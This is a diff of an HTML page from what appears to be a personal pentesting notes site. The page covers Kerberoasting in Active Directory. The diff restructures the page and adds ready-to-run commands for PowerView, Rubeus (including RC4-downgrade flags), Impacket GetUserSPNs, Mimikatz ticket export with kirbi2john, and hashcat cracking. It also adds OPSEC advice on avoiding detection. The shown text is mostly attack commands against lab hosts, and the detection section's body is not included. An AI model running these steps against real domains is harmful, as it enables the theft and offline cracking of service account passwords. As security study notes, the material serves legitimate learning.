@@ -11,7 +11,7 @@
         <link rel="canonical" href="https://jacobh.io/%F0%9F%AA%9F%20Active%20Directory/Credential%20Access%20%26%20Harvesting/Kerberoasting/">
       
       
-        <link rel="prev" href="../Hash%20Cracking/">
+        <link rel="prev" href="../Kerberoasting-o/">
       
       
         <link rel="next" href="../../Credential%20Forgery%20%26%20Abuse/DCShadow/">
@@ -100,7 +100,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#identify" class="md-skip">
+        <a href="#technique" class="md-skip">
           Skip to content
         </a>
       
@@ -3343,6 +3343,29 @@
                 
   
   
+  
+  
+    <li class="md-nav__item">
+      <a href="../Kerberoasting-o/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Kerberoasting o
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
     
   
   
@@ -3392,20 +3415,146 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#identify" class="md-nav__link">
+  <a href="#technique" class="md-nav__link">
     <span class="md-ellipsis">
-      Identify
+      Technique
     </span>
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#exploit" class="md-nav__link">
+  <a href="#prerequisites" class="md-nav__link">
     <span class="md-ellipsis">
-      Exploit
+      Prerequisites
     </span>
   </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#considerations" class="md-nav__link">
+    <span class="md-ellipsis">
+      Considerations
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#execution" class="md-nav__link">
+    <span class="md-ellipsis">
+      Execution
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Execution">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#requesting-a-ticket" class="md-nav__link">
+    <span class="md-ellipsis">
+      Requesting a ticket
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Requesting a ticket">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#powerviewps1" class="md-nav__link">
+    <span class="md-ellipsis">
+      PowerView.ps1
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rubeus" class="md-nav__link">
+    <span class="md-ellipsis">
+      Rubeus
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#impacket" class="md-nav__link">
+    <span class="md-ellipsis">
+      Impacket
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#powershell-mimikatz" class="md-nav__link">
+    <span class="md-ellipsis">
+      PowerShell + Mimikatz
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cracking-a-ticket" class="md-nav__link">
+    <span class="md-ellipsis">
+      Cracking a ticket
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cleanup-considerations" class="md-nav__link">
+    <span class="md-ellipsis">
+      Cleanup Considerations
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#detection-mitigation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Detection &amp; Mitigation
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Detection &amp; Mitigation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#detection" class="md-nav__link">
+    <span class="md-ellipsis">
+      Detection
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#mitigation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Mitigation
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
   
 </li>
       
@@ -4974,20 +5123,146 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#identify" class="md-nav__link">
+  <a href="#technique" class="md-nav__link">
     <span class="md-ellipsis">
-      Identify
+      Technique
     </span>
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#exploit" class="md-nav__link">
+  <a href="#prerequisites" class="md-nav__link">
     <span class="md-ellipsis">
-      Exploit
+      Prerequisites
     </span>
   </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#considerations" class="md-nav__link">
+    <span class="md-ellipsis">
+      Considerations
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#execution" class="md-nav__link">
+    <span class="md-ellipsis">
+      Execution
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Execution">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#requesting-a-ticket" class="md-nav__link">
+    <span class="md-ellipsis">
+      Requesting a ticket
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Requesting a ticket">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#powerviewps1" class="md-nav__link">
+    <span class="md-ellipsis">
+      PowerView.ps1
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rubeus" class="md-nav__link">
+    <span class="md-ellipsis">
+      Rubeus
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#impacket" class="md-nav__link">
+    <span class="md-ellipsis">
+      Impacket
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#powershell-mimikatz" class="md-nav__link">
+    <span class="md-ellipsis">
+      PowerShell + Mimikatz
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cracking-a-ticket" class="md-nav__link">
+    <span class="md-ellipsis">
+      Cracking a ticket
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cleanup-considerations" class="md-nav__link">
+    <span class="md-ellipsis">
+      Cleanup Considerations
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#detection-mitigation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Detection &amp; Mitigation
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Detection &amp; Mitigation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#detection" class="md-nav__link">
+    <span class="md-ellipsis">
+      Detection
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#mitigation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Mitigation
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
   
 </li>
       
@@ -5012,87 +5287,141 @@
 
   <h1>Kerberoasting</h1>
 
-<h2 id="identify">Identify</h2>
+<h2 id="technique">Technique</h2>
 <hr />
-<p><strong>Windows</strong>
-AD Module in powershell
-<div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="nb">Get-ADUser</span> <span class="n">-Filter</span> <span class="p">{</span><span class="n">ServicePrincipalName</span> <span class="o">-ne</span> <span class="s2">&quot;$null&quot;</span><span class="p">}</span> <span class="n">-Properties</span> <span class="n">ServicePrincipalName</span>
-</span></code></pre></div>
-Using Powerview
-<div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="nb">Get-DomainUser</span> <span class="n">-SPN</span> <span class="n">-Properties</span> <span class="n">samaccountname</span><span class="p">,</span><span class="n">ServicePrincipalName</span>
-</span></code></pre></div>
-Living off the land
-<div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="n">setspn</span><span class="p">.</span><span class="n">exe</span> <span class="n">-Q</span> <span class="p">*/*</span>
-</span></code></pre></div>
-Using Rubeus
-<div class="language-Python highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="o">.</span>\<span class="n">Rubeus</span><span class="o">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="o">/</span><span class="n">stats</span>
-</span></code></pre></div>
-<strong>Linux</strong>
-<div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="n">impacket-GetUserSPNs</span> <span class="n">-dc-ip</span> <span class="p">&lt;</span><span class="n">dcip</span><span class="p">&gt;</span> <span class="n">domain</span><span class="p">.</span><span class="n">local</span><span class="p">/</span><span class="n">username</span>
-</span></code></pre></div>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-b<span class="w"> </span><span class="s2">&quot;DC=certified,DC=htb&quot;</span><span class="w"> </span>-s<span class="w"> </span>sub<span class="w"> </span><span class="s2">&quot;(&amp;(objectClass=user)(servicePrincipalName=*))&quot;</span><span class="w"> </span>-H<span class="w"> </span>ldap://10.129.229.25<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span>samaccountname:<span class="w"> </span><span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-f<span class="w"> </span><span class="m">2</span><span class="w"> </span>-d<span class="w"> </span><span class="s2">&quot; &quot;</span>
-</span></code></pre></div></p>
-<h2 id="exploit">Exploit</h2>
+<p>Kerberoasting is a post-exploitation attack technique that targets Microsoft Active Directory. An attacker with credentials for any valid domain account (even a low-privilege one) can request Kerberos service tickets for accounts that have a Service Principal Name (SPN) configured.</p>
+<p>A portion of the returned ticket-granting service (TGS) ticket is encrypted with the NTLM hash of the service account's password. The attacker captures this ticket and takes it offline to crack the password using brute-force methods. Since the cracking happens offline, it does not generate failed login events on the network, making it a stealthy way to escalate privileges by compromising potentially high-value service accounts.</p>
+<h2 id="prerequisites">Prerequisites</h2>
 <hr />
-<p>Make sure you're time is synced with remote host
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>sudo<span class="w"> </span>timedatectl<span class="w"> </span>set-ntp<span class="w"> </span>off
-</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>sudo<span class="w"> </span>rdate<span class="w"> </span>-n<span class="w"> </span>&lt;targetDC&gt;
+<p><strong>Access Level:</strong> A valid Active Directory domain account. No special or elevated privileges are required.</p>
+<p><strong>System State:</strong> The attacker must have network access to a Domain Controller to request tickets.</p>
+<p><strong>Information:</strong> The attacker needs to identify user accounts (not computer accounts) that have an SPN configured.</p>
+<p><strong>Misc</strong>: Your system time must be synced with the DC</p>
+<p>Linux:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>sudo<span class="w"> </span>timedatectl<span class="w"> </span>set-ntp<span class="w"> </span>off
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>sudo<span class="w"> </span>rdate<span class="w"> </span>-n<span class="w"> </span>&lt;targetDC&gt;
 </span></code></pre></div>
-<strong>From Linux</strong>
-<div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="n">impacket-GetUserSPNs</span> <span class="n">-dc-ip</span> <span class="p">&lt;</span><span class="n">dcip</span><span class="p">&gt;</span> <span class="n">domain</span><span class="p">.</span><span class="n">local</span><span class="p">/</span><span class="n">username</span> <span class="n">-request</span>
+<p>Windows:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="n">NET</span> <span class="n">TIME</span> <span class="p">/</span><span class="n">DOMAIN</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="n">NET</span> <span class="n">TIME</span> <span class="p">\\&lt;</span><span class="n">MACHINENAME</span><span class="p">&gt;</span> <span class="p">/</span><span class="nb">SET </span><span class="p">/</span><span class="n">Y</span>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="n">NET</span> <span class="n">TIME</span> <span class="p">\\&lt;</span><span class="n">IP</span> <span class="n">Address</span><span class="p">&gt;</span> <span class="p">/</span><span class="nb">SET </span><span class="p">/</span><span class="n">Y</span>
 </span></code></pre></div>
-<div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="n">impacket-GetUserSPNs</span> <span class="n">-dc-ip</span> <span class="p">&lt;</span><span class="n">dcip</span><span class="p">&gt;</span> <span class="n">domain</span><span class="p">.</span><span class="n">local</span><span class="p">/</span><span class="n">username</span> <span class="n">-request-user</span>
+<h2 id="considerations">Considerations</h2>
+<hr />
+<p><strong>Impact</strong></p>
+<p>Successful cracking of a service account password can lead to significant privilege escalation and lateral movement. Service accounts are often misconfigured with excessive permissions (including Domain Admin) to ensure applications work, making them high-value targets.</p>
+<p><strong>OPSEC</strong></p>
+<ul>
+<li>
+<p><strong>Noise:</strong> Requesting service tickets for many SPNs in a short period can trigger alerts. A single user requesting dozens or hundreds of TGS tickets (Event ID 4769) is highly anomalous.</p>
+</li>
+<li>
+<p><strong>Weak Encryption:</strong> Modern tools like Rubeus allow you to request tickets using the weaker RC4 encryption algorithm (<code>-rc4opsec</code>). While this makes cracking easier, requesting a ticket with encryption type <code>0x17</code> (RC4-HMAC) in an environment that defaults to AES is a major red flag for defenders.</p>
+</li>
+<li>
+<p><strong>Honeypots:</strong> Defenders can create fake service accounts with tempting SPNs (e.g., <code>sql_prod_admin_svc</code>) and monitor them. Any ticket requests for these honeypot accounts are an immediate indicator of compromise.</p>
+</li>
+</ul>
+<h2 id="execution">Execution</h2>
+<hr />
+<h3 id="requesting-a-ticket">Requesting a ticket</h3>
+<h4 id="powerviewps1"><strong>PowerView.ps1</strong></h4>
+<p>Identify kerberoastable users</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">PowerView</span><span class="p">.</span><span class="n">ps1</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="nb">Get-DomainUser</span> <span class="p">*</span> <span class="n">-spn</span> <span class="p">|</span> <span class="nb">select </span><span class="n">samaccountname</span>
 </span></code></pre></div>
-you can also use <code>-outputfile &lt;name&gt;</code>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>nxc ldap &lt;IP&gt; -u &#39;user&#39; -p &#39;&#39; --kerberoasting &lt;OUTFILE&gt;
-</span></code></pre></div></p>
-<p><strong>Crack hash</strong>
-<div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="n">hashcat</span> <span class="n">-m</span> <span class="n">13100</span> <span class="n">hash</span><span class="p">.</span><span class="n">txt</span> <span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">share</span><span class="p">/</span><span class="n">wordlists</span><span class="p">/</span><span class="n">rockyou</span><span class="p">.</span><span class="n">txt</span>
+<p>Request ticket</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="nb">Get-DomainUser</span> <span class="n">-Identity</span> <span class="n">sqldev</span> <span class="p">|</span> <span class="nb">Get-DomainSPNTicket</span> <span class="n">-Format</span> <span class="n">Hashcat</span>
 </span></code></pre></div>
-<strong>From Windows</strong>
-- Semi-manual approach </p>
-<div class="language-Bash highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>setspn.exe<span class="w"> </span>-Q<span class="w"> </span>*/*
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="nb">Get-DomainUser</span> <span class="p">*</span> <span class="n">-SPN</span> <span class="p">|</span> <span class="nb">Get-DomainSPNTicket</span> <span class="n">-Format</span> <span class="n">Hashcat</span> <span class="p">|</span> <span class="nb">Export-Csv</span> <span class="p">.\</span><span class="n">ilfreight_tgs</span><span class="p">.</span><span class="n">csv</span> <span class="n">-NoTypeInformation</span>
 </span></code></pre></div>
-<div class="language-Bash highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>Add-Type<span class="w"> </span>-AssemblyName<span class="w"> </span>System.IdentityModel
-</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>New-Object<span class="w"> </span>System.IdentityModel.Tokens.KerberosRequestorSecurityToken<span class="w"> </span>-ArgumentList<span class="w"> </span><span class="s2">&quot;MSSQLSvc/DEV-PRE-SQL.domain.local:1433&quot;</span>
+<h4 id="rubeus"><strong>Rubeus</strong></h4>
+<p>Get information about kerberoastable users</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="p">.\</span><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="p">/</span><span class="n">stats</span>
 </span></code></pre></div>
-<div class="language-Bash highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>mimikatz<span class="w"> </span><span class="c1"># base64 /out:true</span>
-</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>mimikatz<span class="w"> </span><span class="c1"># kerberos::list /export  </span>
+<p>Kerberoast all users</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="p">.\</span><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">kerberoast</span> 
 </span></code></pre></div>
-<div class="language-Bash highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&lt;base64 blob&gt;&quot;</span><span class="w"> </span><span class="p">|</span><span class="w">  </span>tr<span class="w"> </span>-d<span class="w"> </span><span class="se">\\</span>n<span class="w"> </span>
+<p><strong>Useful flags</strong>:</p>
+<ul>
+<li><code>/outfile</code> outputs roasted hashes to the specified file, one per line.</li>
+<li><code>/tgtdeleg</code> accounts with AES enabled in <code>msDS-SupportedEncryptionTypes</code> will have RC4 tickets requested. (Doesn't work on &gt;= Win 2019)</li>
+<li><code>/rc4opsec</code> tgtdeleg trick is used, and accounts without AES enabled are enumerated and roasted.</li>
+<li><code>/simple</code> output tickets one per line in the terminal</li>
+<li><code>/nowrap</code> don't wrap new lines and output to terminal</li>
+<li><code>/user:&lt;DomainUser&gt;</code> specify user to kerberoast</li>
+</ul>
+<h4 id="impacket"><strong>Impacket</strong></h4>
+<p>Kerberoast all users</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>impacket-GetUserSPNs<span class="w"> </span>domain.local/username:<span class="s1">&#39;password&#39;</span><span class="w"> </span>-request<span class="w"> </span>-dc-ip<span class="w"> </span>&lt;dcip&gt;
 </span></code></pre></div>
-<div class="language-Bash highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>cat<span class="w"> </span>encoded_file<span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d<span class="w"> </span>&gt;<span class="w"> </span>sqldev.kirbi
+<p>Kerberoast specific user</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>impacket-GetUserSPNs<span class="w"> </span>domain.local/username:<span class="s1">&#39;password&#39;</span><span class="w"> </span>-request-user<span class="w"> </span>&lt;user&gt;<span class="w"> </span>-dc-ip<span class="w"> </span>&lt;dcip&gt;
 </span></code></pre></div>
-<div class="language-Python highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="n">python2</span><span class="mf">.7</span> <span class="n">kirbi2john</span><span class="o">.</span><span class="n">py</span> <span class="n">sqldev</span><span class="o">.</span><span class="n">kirbi</span>
+<p><strong>Useful flags:</strong></p>
+<ul>
+<li><code>-outputfile</code> send output to file</li>
+</ul>
+<h4 id="powershell-mimikatz"><strong>PowerShell</strong> + Mimikatz</h4>
+<p>Identify kerberoastable users.</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="nb">Get-ADUser</span> <span class="n">-Filter</span> <span class="p">{</span><span class="n">ServicePrincipalName</span> <span class="o">-ne</span> <span class="s2">&quot;$null&quot;</span><span class="p">}</span> <span class="n">-Properties</span> <span class="n">ServicePrincipalName</span>
+</span></code></pre></div>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>setspn.exe -Q */*
+</span></code></pre></div>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="nb">Add-Type</span> <span class="n">-AssemblyName</span> <span class="n">System</span><span class="p">.</span><span class="n">IdentityModel</span>
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IdentityModel</span><span class="p">.</span><span class="n">Tokens</span><span class="p">.</span><span class="n">KerberosRequestorSecurityToken</span> <span class="n">-ArgumentList</span> <span class="s2">&quot;MSSQLSvc/DEV-PRE-SQL.domain.local:1433&quot;</span>
+</span></code></pre></div>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="n">mimikatz</span> <span class="c"># base64 /out:true</span>
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="n">mimikatz</span> <span class="c"># kerberos::list </span>
+</span></code></pre></div>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="nb">echo </span><span class="s2">&quot;&lt;base64 blob&gt;&quot;</span> <span class="p">|</span>  <span class="n">tr</span> <span class="n">-d</span> <span class="p">\\</span><span class="n">n</span>
+</span></code></pre></div>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>cat<span class="w"> </span>encoded_file<span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d<span class="w"> </span>&gt;<span class="w"> </span>sqldev.kirbi
+</span></code></pre></div>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>python2.7<span class="w"> </span>kirbi2john.py<span class="w"> </span>sqldev.kirbi
 </span></code></pre></div>
 <p>This will create a file called <code>crack_file</code>. We then must modify the file a bit to be able to use Hashcat against the hash.</p>
-<div class="language-Python highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="n">sed</span> <span class="s1">&#39;s/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*</span><span class="se">\1</span><span class="s1">\*\$</span><span class="se">\2</span><span class="s1">/&#39;</span> <span class="n">crack_file</span> <span class="o">&gt;</span> <span class="n">sqldev_tgs_hashcat</span>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>sed<span class="w"> </span><span class="s1">&#39;s/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/&#39;</span><span class="w"> </span>crack_file<span class="w"> </span>&gt;<span class="w"> </span>sqldev_tgs_hashcat
 </span></code></pre></div>
-<p>Crack the file</p>
-<div class="language-Python highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="n">hashcat</span> <span class="o">-</span><span class="n">m</span> <span class="mi">13100</span> <span class="n">sqldev_tgs_hashcat</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">rockyou</span><span class="o">.</span><span class="n">txt</span> 
+<h3 id="cracking-a-ticket">Cracking a ticket</h3>
+<p>Kerberos 5 TGS-REP (etype 23, RC4-HMAC-MD5)</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">13100</span><span class="w"> </span>-a<span class="w"> </span><span class="m">0</span><span class="w"> </span>hashes.txt<span class="w"> </span>/path/to/wordlist.txt
 </span></code></pre></div>
-<div class="admonition info">
-<p class="admonition-title">note</p>
-<p>If we decide to skip the base64 output with Mimikatz and type <code>mimikatz # kerberos::list /export</code>, the .kirbi file (or files) will be written to disk. In this case, we can download the file(s) and run <code>kirbi2john.py</code> against them directly, skipping the base64 decoding step.</p>
-</div>
-<p><strong>PowerView</strong>
-<div class="language-Python highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="n">Import</span><span class="o">-</span><span class="n">Module</span> <span class="o">.</span>\<span class="n">PowerView</span><span class="o">.</span><span class="n">ps1</span>
-</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="n">Get</span><span class="o">-</span><span class="n">DomainUser</span> <span class="o">*</span> <span class="o">-</span><span class="n">spn</span> <span class="o">|</span> <span class="n">select</span> <span class="n">samaccountname</span>
-</span></code></pre></div>
-<div class="language-Python highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="n">Get</span><span class="o">-</span><span class="n">DomainUser</span> <span class="o">-</span><span class="n">Identity</span> <span class="n">sqldev</span> <span class="o">|</span> <span class="n">Get</span><span class="o">-</span><span class="n">DomainSPNTicket</span> <span class="o">-</span><span class="n">Format</span> <span class="n">Hashcat</span>
-</span></code></pre></div>
-<div class="language-Python highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="n">Get</span><span class="o">-</span><span class="n">DomainUser</span> <span class="o">*</span> <span class="o">-</span><span class="n">SPN</span> <span class="o">|</span> <span class="n">Get</span><span class="o">-</span><span class="n">DomainSPNTicket</span> <span class="o">-</span><span class="n">Format</span> <span class="n">Hashcat</span> <span class="o">|</span> <span class="n">Export</span><span class="o">-</span><span class="n">Csv</span> <span class="o">.</span>\<span class="n">ilfreight_tgs</span><span class="o">.</span><span class="n">csv</span> <span class="o">-</span><span class="n">NoTypeInformation</span>
-</span></code></pre></div>
-<strong>Rubeus</strong>
-List info about kerberoastable accounts
-<div class="language-Python highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="o">.</span>\<span class="n">Rubeus</span><span class="o">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="o">/</span><span class="n">stats</span>
-</span></code></pre></div>
-target admin acccounts
-<div class="language-Python highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="o">.</span>\<span class="n">Rubeus</span><span class="o">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="o">/</span><span class="n">ldapfilter</span><span class="p">:</span><span class="s1">&#39;admincount=1&#39;</span> <span class="o">/</span><span class="n">nowrap</span>
-</span></code></pre></div>
-use tgt delegation to force RC4 downgrade of tickets. (Doesn't work on &gt;= Win 2019)
-<div class="language-Python highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="o">.</span>\<span class="n">Rubeus</span><span class="o">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="o">/</span><span class="n">tgtdeleg</span> <span class="o">/</span><span class="n">nowrap</span>
